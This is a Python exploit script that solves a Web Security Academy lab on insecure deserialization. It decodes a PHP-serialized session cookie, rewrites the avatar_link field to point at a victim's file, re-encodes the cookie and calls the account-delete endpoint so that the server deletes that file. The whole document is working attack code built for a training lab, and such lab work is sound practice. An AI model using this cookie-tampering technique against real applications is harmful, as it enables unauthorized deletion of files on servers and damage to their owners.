# Lab: Using application functionality to exploit insecure deserialization
# difficulty: practitioner

import requests
import base64
import re

sub = '0a5500c7032d303180c5301f00a000a9'
url = f'https://{sub}.web-security-academy.net'

def login():
    global session
    session = requests.Session()
    body = {
        'username': 'wiener',
        'password': 'peter'
    }
    session.post(url + '/login', data=body)

def exploit():
    cookie = session.cookies['session'].replace('%3d', '=')
    cookie = base64.b64decode(cookie)
    print(cookie)

    # replacing avatar link
    pattern = r'link";(.*);}'
    token = re.findall(pattern, cookie.decode())[0].encode()
    victim = '/home/carlos/morale.txt'
    cookie = cookie.replace(token, f's:{len(victim)}:"{victim}"'.encode())

    # base64 session    
    cookie = base64.urlsafe_b64encode(cookie).decode()

    session.cookies.clear()
    session.cookies['session'] = cookie
    r = session.post(url + '/my-account/delete', allow_redirects=False) # deletes file from avatar_link
    print(r.request.headers)

if __name__ == '__main__':
    login()
    exploit()